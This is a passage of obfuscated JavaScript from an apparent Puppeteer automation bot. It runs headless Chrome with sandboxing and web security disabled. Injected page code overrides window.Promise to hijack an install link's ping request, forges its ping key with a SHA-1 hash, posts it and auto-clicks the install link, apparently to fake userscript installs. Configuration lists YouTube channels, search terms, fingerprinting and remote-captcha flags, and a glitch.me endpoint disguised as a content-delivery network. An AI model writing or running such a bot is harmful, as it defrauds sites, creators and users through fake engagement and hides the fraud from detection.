0x9a7 + 0x244e + -0x2df5), J[-0x1 * 0xf5b + -0xfad + 0x2e * 0xad] = this['hBytes'] << 0x373 + -0x635 + 0x2c5 | this['bytes'] >>> -0x5fa + 0x24cb + 0x1 * -0x1eb4, J[-0x123a + 0x8cb + -0x97e * -0x1] = this['bytes'] << -0x1 * -0x422 + -0x1305 + -0x1 * -0xee6, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x2df * 0x5 + -0x3 * 0x4df + 0x52; J < -0x16f1 + 0x9c4 + 0xd7d; ++J)
                K = Q[J - (-0x2 * 0xca4 + -0x169a + -0x3d * -0xc9)] ^ Q[J - (0x1f6d + -0x417 * -0x3 + -0x2baa)] ^ Q[J - (-0x1 * 0x21c4 + -0x78d + 0x5e9 * 0x7)] ^ Q[J - (0x229d + -0x21d6 + -0xb7)], Q[J] = K << 0x1 * -0x26ad + 0x1b65 + 0xb49 | K >>> 0xc94 + 0x8d5 + -0xa * 0x221;
              for (J = 0x2 * 0x1125 + 0x22a1 + -0x44eb; J < -0xd * 0xa6 + -0x3b * -0x69 + -0xfb1; J += -0x12b1 + 0x5c5 * 0x6 + -0x3fa * 0x4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2660 + -0x67 * 0x1d + 0x3210 | L >>> 0xa1 * -0x18 + 0x1b5d * 0x1 + -0x3 * 0x40e) + (M & N | ~M & O) + P + (-0x1f2857 * 0x66 + 0x3193ca8 * -0xa + -0x8aca05 * -0xf7) + Q[J] << 0x1acd + -0x18d6 + -0x1f7) << -0x1166 + 0x1 * -0xb11 + 0x1 * 0x1c7c | P >>> -0x1 * -0x1541 + -0x1d * 0x10 + 0x14a * -0xf) + (L & (M = M << -0x2 * 0x3a1 + -0x1e3 + 0x943 | M >>> 0xd6a * -0x1 + -0x2554 * -0x1 + -0x17e8) | ~L & N) + O + (-0x61a975c4 + 0x9b5c293f + 0x472f3d * 0x76) + Q[J + (0x4e3 * 0x7 + -0x2 * -0x6c6 + -0x17e0 * 0x2)] << -0x766 * 0x2 + -0xa6b + 0x1937) << -0x25f5 + 0x7 * 0x22d + 0x16bf | O >>> 0x1a49 + -0x181 * -0x8 + -0x2636) + (P & (L = L << 0xa92 + -0x17b7 + 0xd43 | L >>> -0x1d77 * 0x1 + -0x5 * 0x2cb + 0x1 * 0x2b70) | ~P & M) + N + (0x14966 * 0x78f3 + -0x9 * -0xaf5a434 + -0xa3c0c80d) + Q[J + (-0x231f + 0x1 * -0x1df5 + 0x4116 * 0x1)] << 0xd * -0x1fc + 0xbf4 + -0x2 * -0x6ec) << -0xb51 + 0x2398 + -0x1842 | N >>> 0x105a + 0xeb7 * 0x1 + -0x1ef6) + (O & (P = P << 0x1c * 0x24 + -0x1c * -0x55 + -0xd1e | P >>> 0xfef * -0x2 + -0x8a8 + 0x4 * 0xa22) | ~O & L) + M + (-0x2c84b1 * 0x335 + -0x158a36db * -0x5 + 0x81 * 0xf93777) + Q[J + (0x3 * -0xa16 + -0x10f7 * 0x2 + 0x4033)] << 0x24 * 0x81 + 0x1331 + -0x2555) << 0x6a * 0x25 + 0x934 + -0x1881 | M >>> 0x9ff + -0x22d2 + 0x2 * 0xc77) + (N & (O = O << -0x2 * 0x38b + 0x1a3f * 0x1 + 0x145 * -0xf | O >>> -0x1949 * 0x1 + 0x15b8 + 0x393) | ~N & P) + L + (0x5cfc378 + 0x6f4cfd83 + 0x14a1 * -0x14a22) + Q[J + (-0x1d14 + 0x1e38 + -0x120)] << -0x7a * -0x4b + -0x398 + 0xa * -0x337, N = N << -0x1 * 0x2315 + -0x23c9 + 0x46fc | N >>> 0x92e + 0x4 * -0x1b4 + -0x25c;
              for (; J < 0x1ff3 + -0x191 * -0x6 + -0x2931; J += -0x1bc1 + 0x2622 + -0xa5c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2231 * -0x1 + -0xc26 + -0x1606 | L >>> -0x2c * 0x47 + -0x775 * -0x1 + 0x36 * 0x17) + (M ^ N ^ O) + P + (-0xb7d0f72b + 0x52006b * 0x2a + 0x11936d13e) + Q[J] << -0x5a4 + 0x317 * -0x7 + -0x219 * -0xd) << 0x1a25 + 0xeb2 + -0x28d2 | P >>> -0xa59 * -0x3 + 0x249b + -0x1 * 0x438b) + (L ^ (M = M << -0x1066 + -0x6 * -0x62b + 0x1 * -0x147e | M >>> 0x13b2 + -0x1007 + 0x3a9 * -0x1) ^ N) + O + (0x10434e5c * 0x9 + 0x83d406cd + -0xa757dc68) + Q[J + (-0xd23 + -0x1461 + 0x2185)] << 0x52b + 0xd8d * 0x1 + -0x257 * 0x8) << 0x815 + -0x2 * 0x47 + -0x782 | O >>> 0x266d + 0xdc1 + -0x3413 * 0x1) + (P ^ (L = L << 0x2490 + 0xa4c + -0x2ebe | L >>> -0x6be * 0x1 + 0x611 * -0x3 + 0x18f3) ^ M) + N + (0x685e87b6 + 0x640a69a5 + -0x5d8f05ba) + Q[J + (-0x8 * 0x4bd + -0x1 * 0x99e + 0x9 * 0x548)] << 0xebc + -0x248 * -0xd + -0x2c64) << 0x5a4 + 0xab5 * 0x2 + -0x1b09 | N >>> 0x5a * 0xb + -0x1 * 0x878 + 0x4b5) + (O ^ (P = P << -0x261c + 0x466 * -0x3 + -0xcdb * -0x4 | P >>> -0x28f * 0x7 + 0x1a1e + 0x833 * -0x1) ^ L) + M + (0x8c4c3d70 * 0x1 + 0xb40ab1e2 + -0xd17d03b1 * 0x1) + Q[J + (0x1f39 * -0x1 + -0x1b * -0x11a + -0x2 * -0xbf)] << 0x765 + -0x127e + -0x3b3 * -0x3) << 0x136b + 0x3 * -0x11d + 0x1 * -0x100f | M >>> -0x49 * 0x76 + 0x25 * 0x97 + 0xbee) + (N ^ (O = O << 0x17 * -0x139 + 0x886 + 0x13b7 | O >>> 0x14bb + -0x23f9 * 0x1 + 0xf40) ^ P) + L + (0x1a73e878 + 0x4 * 0x2c2f1932 + -0x5c56619f) + Q[J + (0x22bd + -0x585 + 0x42c * -0x7)] << 0x2648 + -0x17f3 + -0xe55, N = N << 0x189 * 0x4 + -0x262b * -0x1 + -0x2c31 | N >>> -0x7 * -0x13 + 0x10f3 + 0x1e * -0x95;
              for (; J < 0x1aae + 0x156c + -0x2fde; J += -0x1579 * 0x1 + 0x1 * -0x652 + 0x1bd0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1661 + 0x1 * 0x1bfd + -0x1 * 0x3259 | L >>> 0x7 * 0x101 + -0x1 * -0x3e7 + -0xad3) + (M & N | M & O | N & O) + P - (-0x1 * 0x80ae853b + 0x6c67c6 * 0xac + 0xa8bd0f57) + Q[J] << -0x21f1 + 0xfec * 0x1 + 0x1205) << 0x161b * 0x1 + 0x3 * -0x29b + -0x1 * 0xe45 | P >>> 0x4e1 + 0x4dc * -0x1 + 0x16) + (L & (M = M << -0xf91 + 0x5df * -0x6 + -0x1 * -0x32e9 | M >>> 0xd0c + -0x19d6 + 0x111 * 0xc) | L & N | M & N) + O - (0x7ab229 * 0x13d + -0x3ae0b2c7 * -0x1 + -0x61eb0c68) + Q[J + (0x1 * -0x9e5 + 0x5 * 0x7bb + -0x1cc1)] << -0xb64 * 0x3 + -0xbd7 + 0x2e03) << 0xedf * 0x1 + -0xa15 + -0x4c5 | O >>> -0x203a + -0x16c6 + -0x371b * -0x1) + (P & (L = L << 0x13b4 + -0x1 * -0xae7 + 0x5 * -0x619 | L >>> -0x1df9 + 0xd46 + 0x10b5) | P & M | L & M) + N - (0xb96e3d6b + 0x1 * 0xab4d0673 + -0x29c3 * 0x5d6be) + Q[J + (-0xa4c + -0x144 * -0x17 + 0x12ce * -0x1)] << -0xcd3 + -0x2334 + 0x3007) << -0x1 * -0x1a0f + -0x2 * -0x469 + -0x22dc | N >>> 0x2 * 0x836 + -0x600 + 0x1 * -0xa51) + (O & (P = P << -0x1 * 0x23f6 + 0x5 * 0x4ae + 0xcae * 0x1 | P >>> 0x20e6 + -0x1750 + 0x4 * -0x265) | O & L | P & L) + M - (-0x38c50 * 0x3583 + -0x22 * 0x2cc684f + 0x18de77a92) + Q[J + (0x6d * -0xc + -0x868 * -0x2 + -0x1 * 0xbb1)] << -0x26ab + 0x217c + 0x52f) << -0x4af * -0x7 + -0xfb0 + -0x1114 | M >>> -0x1a95 + -0x1683 + 0x3133) + (N & (O = O << -0x1 * -0x7a7 + -0x76 * -0x5 + 0x9d7 * -0x1 | O >>> 0xf5a + 0x127a + -0x21d2) | N & P | O & P) + L - (-0xd4dd * -0x5938 + -0x2349 * 0x254f9 + 0x29300c3 * 0x2f) + Q[J + (-0xe97 + 0xf4 * 0x1f + 0x2d * -0x55)] << 0x9 * -0x409 + -0x3cb * 0x3 + -0xb * -0x456, N = N << 0x7b3 + -0x25 * -0x39 + -0xfd2 | N >>> 0x1 * -0x1a3e + 0x57c + 0x14c4;
              for (; J < 0x38f * 0x1 + 0xc * -0x2ad + 0x9 * 0x335; J += -0x1c29 + -0x33a * 0x3 + 0x25dc * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xb9c * 0x2 + -0x21 * -0xad + 0xf0 | L >>> -0x506 * 0x6 + 0xef * -0x4 + 0x21fb * 0x1) + (M ^ N ^ O) + P - (0x28f14dd * -0xd + -0x4669c889 + -0xd1b9729 * -0xc) + Q[J] << -0x16 * 0x191 + -0xf0 * -0x2 + -0x2096 * -0x1) << 0x1 * 0x1987 + -0x1352 + 0x84 * -0xc | P >>> -0x1 * -0x2267 + 0x1 * 0x196c + -0x3bb8) + (L ^ (M = M << 0x29b * -0x5 + -0xa02 + 0x1 * 0x1727 | M >>> 0x199 + -0x1bd * -0x15 + 0x1 * -0x2618) ^ N) + O - (-0x1a6035 * 0xf9 + -0x5c8c2853 + 0xabd0fa0a) + Q[J + (0x22ac + 0x1659 + -0x3904)] << 0x80d + 0x6a9 + -0xeb6) << 0x2267 + -0x8 * -0x47 + 0x2 * -0x124d | O >>> 0x8 * -0x73 + 0x1 * -0x6cd + 0x30 * 0x38) + (P ^ (L = L << -0x122e + 0x1fcb + -0x1 * 0xd7f | L >>> -0x122b + -0x25 * 0x9e + 0x2903) ^ M) + N - (-0x739 * 0x38d37 + -0x36837 * 0x1845 + 0xa1f46f3c) + Q[J + (0x7 * 0x1f6 + -0x268b + -0x29 * -0x9b)] << 0x9bc * 0x3 + 0x2672 + -0x43a6) << -0x29 * 0xa1 + -0x21fe + 0x3bcc | N >>> 0x22 * -0xaa + 0x1 * -0x694 + -0x21 * -0xe3) + (O ^ (P = P << -0x15d1 + 0xafa + 0x5 * 0x231 | P >>> 0x2275 + -0x140f * -0x1 + 0x1 * -0x3682) ^ L) + M - (-0x2926 * 0x153a9 + 0x16b6282 * 0x42 + 0xe8654bc) + Q[J + (0x162 * -0x2 + 0x3 * 0xfa + -0x27)] << 0x1ebe + 0x140e + 0x1 * -0x32cc) << 0x1 * -0x2605 + -0x22d4 + 0x48de | M >>> -0x2493 + -0x1d0b + 0x41b9 * 0x1) + (N ^ (O = O << 0x1 * 0x1e41 + -0x1 * 0x264b + 0x4 * 0x20a | O >>> -0x5 * 0x12c + 0x19ab + -0x89 * 0x25) ^ P) + L - (-0x308a67f + -0x2852efc2 + 0x60f8d46b) + Q[J + (-0x1e6a + -0x1a49 + 0x38b7)] << 0x2 * 0x8ad + -0x12 * 0xc4 + -0x392 * 0x1, N = N << -0x8f4 + -0x986 + 0x118 * 0x11 | N >>> -0x9 * 0x1f0 + -0x1 * -0xf3a + 0x238;
              this['h0'] = this['h0'] + L << -0x1 * 0xa5b + -0x1445 + -0x62 * -0x50, this['h1'] = this['h1'] + M << 0xded + 0x1f50 + 0x2d3d * -0x1, this['h2'] = this['h2'] + N << -0x4c2 + 0xd79 + -0x8b7, this['h3'] = this['h3'] + O << -0xa * 0x1e9 + -0x10fd * -0x2 + 0x1 * -0xee0, this['h4'] = this['h4'] + P << -0x246f + -0x1 * -0x2452 + 0x1d;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2330 + 0x2 * -0x77b + -0x2 * -0x1921 & -0x1 * -0x25c2 + -0x15ee + -0xfc5] + w[J >> 0x143 * 0x1e + 0x6b * -0x9 + -0x21ff & 0x37 * -0xb + -0x3 * 0xc01 + 0x1 * 0x266f] + w[J >> -0x1b * -0x93 + 0xc7b + -0x5e * 0x4c & 0xfa0 + 0x73 * -0x1 + -0xf1e] + w[J >> 0xa6f * 0x1 + -0x25f * 0x6 + 0x7 * 0x8d & -0x2e * 0x4e + -0x4f + -0x731 * -0x2] + w[J >> 0x456 + -0x623 * 0x3 + 0x3 * 0x4b5 & 0x717 * -0x5 + -0x1b * -0x13d + 0x3 * 0xb1] + w[J >> -0x10d * 0x3 + -0xfe1 + -0x8 * -0x262 & -0x1 * 0x10cd + 0x3 * 0x9d1 + -0xb * 0x125] + w[J >> -0x170b + 0x4 * 0x106 + 0x12f7 & 0x1641 + 0x1e64 + -0x3496] + w[-0x1af5 * -0x1 + -0x1950 + -0x196 & J] + w[K >> -0x1 * 0x1ee + 0x2 * 0x135d + 0x4 * -0x92c & 0x30a * 0x1 + -0x1 * -0x235f + -0x265a] + w[K >> 0x272 + 0x1825 + -0x143 * 0x15 & 0x5f * -0x1f + -0x1b2d + 0x26bd] + w[K >> 0xa * 0x1f9 + -0x1292 + -0x114 & 0xd82 + 0x1399 + -0x210c] + w[K >> -0x795 * 0x1 + -0x1 * 0x3a2 + 0xb47 & 0x1b6e + -0x2554 + 0x9f5 * 0x1] + w[K >> -0x17ff + -0x269a + 0x3ea5 & 0xa5e * 0x1 + -0x1139 * 0x1 + -0xa * -0xb1] + w[K >> 0x188a + -0x4 * 0x998 + 0xdde & -0xcc4 + 0x1858 + -0xb85] + w[K >> -0x14c9 + 0x14e3 + -0x16 & 0xb * 0x178 + -0x4ac + -0xc3 * 0xf] + w[-0x33d * 0x1 + 0x8dd + -0x591 & K] + w[L >> -0x1ae4 * 0x1 + -0x2 * -0xd01 + -0xfe * -0x1 & -0x10d * 0x6 + 0x3 * -0x653 + -0x45 * -0x5e] + w[L >> -0x19a1 + -0x1ae9 + -0x1a51 * -0x2 & -0x3 * 0x8ae + 0x1118 + -0x901 * -0x1] + w[L >> -0xedb + 0x3 * 0x406 + -0x1 * -0x2dd & 0x1809 + 0x164 * 0x1c + 0x3eea * -0x1] + w[L >> -0x8 * -0x1d4 + -0x107b + 0x1 * 0x1eb & 0x1 * 0x269e + -0xbf5 + -0x1a9a] + w[L >> -0x26eb + 0x2710 + 0x5 * -0x5 & -0x2 * 0x9b6 + -0x143b * 0x1 + 0x187 * 0x1a] + w[L >> -0x94b * 0x1 + -0x23be + 0x2d11 & 0x799 + 0x4 * 0x539 + 0xe37 * -0x2] + w[L >> -0x12ad + 0x1 * -0x1fbc + 0x326d & 0xe9b + -0x2b9 + -0xbd3] + w[0x2619 + 0x11 * 0x13a + -0x2 * 0x1d72 & L] + w[M >> 0x8d4 * -0x1 + 0x52 * 0x28 + -0x3e0 & 0x12c2 + 0x2 * -0xada + 0x301] + w[M >> -0xdc1 + -0xf9 * 0x8 + 0x31 * 0x71 & -0x1e10 + 0x13a * -0xf + 0x3085] + w[M >> 0xe6 + -0xd24 * 0x2 + -0xcbb * -0x2 & 0xc59 * 0x1 + -0x326 + 0x2 * -0x492] + w[M >> 0x4 * 0x82 + -0x16e4 + -0x2 * -0xa76 & 0x1738 + -0xd * -0x61 + -0x1c16] + w[M >> -0x23f5 + -0x731 * 0x2 + 0x3263 & -0xd + -0x18b3 * -0x1 + -0x1897] + w[M >> 0xa67 + -0x8 * -0x3d + -0xc47 & 0x2384 + 0x3b9 + -0x272e] + w[M >> -0x472 + 0x81 * 0x3b + -0x1 * 0x1945 & 0x1e34 + 0x11af + -0x2fd4] + w[0x2074 * 0x1 + -0x5e3 + -0x1a82 & M] + w[N >> -0x77e + -0x4e3 + -0x17 * -0x8b & 0x461 + 0x1da4 + 0x36 * -0xa1] + w[N >> -0x1f2 + -0x241b + 0x2625 & 0x8 * 0x365 + 0x1ef9 + 0x2 * -0x1d09] + w[N >> 0x19de + 0xcd7 + -0x26a1 & 0x737 * 0x1 + 0x3d + -0x277 * 0x3] + w[N >> -0x1b * -0x1 + 0x23e9 * -0x1 + 0x23de & -0x9e5 * -0x1 + 0x135 * -0xe + 0x710] + w[N >> -0x5 * 0x455 + 0xa * 0x1 + 0x739 * 0x3 & 0xf23 + -0x10d3 * -0x1 + -0x1fe7] + w[N >> -0x239 * -0x1 + -0x569 + 0x4 * 0xce & -0x1e09 + -0x4 * 0x8e0 + 0x4198] + w[N >> 0x5e * 0x25 + -0x2055 * 0x1 + -0x3 * -0x641 & -0xd3f + -0x1f28 + 0x15 * 0x21e] + w[-0x3 * -0xc29 + 0x10fa + 0x1ab3 * -0x2 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xd26 + 0xe * 0x1af + 0x125 * -0x20 & 0xa63 + -0x54 * -0x65 + 0x1 * -0x2a88,
                J >> -0x1ae * 0x10 + -0x100f * -0x2 + -0x52e & -0x3 * -0x363 + 0x499 * -0x1 + -0x491,
                J >> 0x15a2 + -0x172b + 0x1 * 0x191 & -0x22b5 + 0x19a5 + 0xa0f,
                0x2 * 0x12e + 0x243e + -0x1 * 0x259b & J,
                K >> -0x21a3 * -0x1 + -0x1a47 + -0xba * 0xa & 0x1bba + -0x8c8 + -0x11f3,
                K >> -0x63 * -0x52 + -0x1 * -0x2623 + -0x9 * 0x7c1 & 0x131 * 0xd + -0xfed + 0x16f,
                K >> 0xd * -0x145 + 0xd4f + 0x3b * 0xe & -0x60d * 0x4 + 0x35 * 0x2f + -0x78 * -0x21,
                -0x1737 + 0xece + 0x968 & K,
                L >> -0x2b4 * -0xc + -0x1347 + -0x29d * 0x5 & -0x165b + 0x221d + -0xac3,
                L >> 0x1c39 + 0x1f7 * -0x13 + -0x496 * -0x2 & 0x89f * -0x3 + 0x1193 + 0x1 * 0x949,
                L >> 0x61 * -0x3e + -0x14a1 * 0x1 + 0x7f * 0x59 & 0x8d0 + 0x13ee + -0x1bbf,
                -0x7a5 + 0x47f * -0x1 + 0xd23 & L,
                M >> 0x907 * 0x4 + -0x1 * -0x20c + -0x2610 & -0x836 + -0x187 * -0x15 + -0x1 * 0x16de,
                M >> -0x12b2 + -0xf * 0x21d + 0x3275 & 0x14d3 + 0x1f97 + 0x336b * -0x1,
                M >> 0x4 * 0x1b7 + -0xf * 0x1b7 + 0x2b3 * 0x7 & -0x23ba + 0x157b + -0xf3e * -0x1,
                0x1ebf * -0x1 + -0x260e + 0x1 * 0x45cc & M,
                N >> -0x1 * -0x1dc0 + 0x7e4 + -0x258c & 0x7 * 0x371 + -0xbdb + -0xb3d,
                N >> -0x1543 * -0x1 + 0x18a4 * -0x1 + 0x371 & 0x23d7 + -0x11 * 0x19a + -0x4b * 0x1a,
                N >> 0x2 * -0x340 + 0x1e4f + 0x17c7 * -0x1 & 0x3cb * -0x1 + 0x14b6 + -0xfec,
                0x47f * 0x2 + 0x1 * -0x1ea1 + -0x1 * -0x16a2 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x3f3 + 0xda7 * -0x2 + 0x1 * 0x1f55), (K = new DataView(J))['setUint32'](-0x15f3 * 0x1 + 0xf49 + 0x6aa, this['h0']), K['setUint32'](-0x10d8 + 0x625 + 0xab7, this['h1']), K['setUint32'](-0x21af + 0x4ed + 0x1cca * 0x1, this['h2']), K['setUint32'](-0x3df + 0x468 + 0x19 * -0x5, this['h3']), K['setUint32'](-0x1eab + 0x22 * -0xea + 0x3dcf, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x13d * -0x2 + 0x19c6 + -0x174c];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x68a + 0x10ab + -0x1735;
            J[-0x24be + -0x165b + 0x3b19]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x694 * -0x4 + -0xba2 + 0xeae * -0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x115e + 0x1 * 0x1825 + -0x2982), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xd1b + -0x24de + 0x17c4;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1490 + 0x20cd + -0x661), Promise['resolve'](0x35 * 0x95 + 0xeac + -0x2d84);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x2655 + -0x25ec + 0x15 * -0x5; j < 0x89e + 0x61b * -0x5 + 0x15ea; j++)
    i();
}

function a() {
  const bl = [
    't-fill\x20yt-',
    '-chat-gpt-',
    ')\x20AppleWeb',
    'ErpcO8oBWRvAx8odc0i',
    'https://op',
    'CMSUz2XPDgnOlG',
    'versions',
    'yXbpW792WOq3W53cK8kc',
    'WQaZcCoAW65ObSkpb8oR',
    'Bc9vq0fPtgzQtG',
    'WPZdKbXJWOr+WQVcNMyT',
    'BwfUywDLCI1RCG',
    'W5CPlg1lb10Igay',
    'q3n4BeXnyJzvAG',
    'W6lcRHipteNdMWldSCk3',
    'DxP6sY0Wntjima',
    'bWvNtmkOfSkBrNyB',
    'jsaMWQpcN3ihbdNdRa',
    'lwjLyxv0Awz5lq',
    'CMfUzg9T',
    '\x20(KHTML,\x20l',
    'WPm5WQeJgCkxrCoUeCkR',
    'C09oEKrMAKTOta',
    'tZqTqJnprLbezG',
    'd,sad\x20bts,',
    'XDo7Q7yUEt',
    'v8k8W4BcPfPbWQVdGCkNma'
  ];
  a = function() {
    return bl;
  };
  return a();
}
const NETWORK_PATIENCE = -0x1a14 + -0x2f * -0xce + 0x2 * 0x9c1 + (-0xec1 + 0xc * 0x1e7 + -0x3a5 * -0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1e5 * -0x5 + -0x140 * -0x1f + -0xea2 * 0x2) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + U(0x9) + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * 0x892 + 0xc08 + -0x149a; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * 0x325 + -0x1d6e * -0x1 + -0x1a3f)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x578 + -0x1 * 0x10be + -0x20 * -0xb2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 